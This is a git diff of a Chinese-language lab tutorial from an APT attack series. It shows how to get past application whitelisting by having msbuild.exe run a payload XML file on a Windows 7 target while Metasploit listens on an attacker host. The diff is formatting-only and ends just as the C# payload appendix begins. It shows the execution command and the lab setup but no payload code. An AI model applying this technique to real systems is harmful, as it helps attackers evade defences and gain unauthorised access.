@@ -1,9 +1,7 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
 
-**MSBuild简介：**
+### MSBuild简介：
 
-MSBuild是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual Studio的生成实验室环境中组织和生成产品。
+MSBuild 是 Microsoft Build Engine 的缩写，代表 Microsoft 和 Visual Studio的新的生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual Studio的生成实验室环境中组织和生成产品。
 
 MSBuild 引入了一种新的基于 XML的项目文件格式，这种格式容易理解、易于扩展并且完全受 Microsoft 支持。MSBuild项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用不同的平台和配置生成这些项。
 
@@ -12,19 +10,23 @@ MSBuild 引入了一种新的基于 XML的项目文件格式，这种格式容�
 基于白名单MSBuild.exe配置payload：
 
 Windows 7默认位置为：
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe`
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
+```
 
-**攻击机：**192.168.1.4 Debian
+**攻击机：**192.168.1.4 Debian  
 **靶机：** 192.168.1.3 Windows 7
 
-**靶机执行：**
-`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Micropoor.xml`
+### 靶机执行：
+```bash
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Micropoor.xml
+```
 ![](media/0dec9e476e8a77edc2e1fa1a43329f76.jpg)
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ![](media/57d9f8497cc0fcd01e0d51b5b6dc0e2a.jpg)
 
-## 附录：Micropoor.xml
+### 附录：Micropoor.xml
 **注：x86 payload**
 
 ```c#
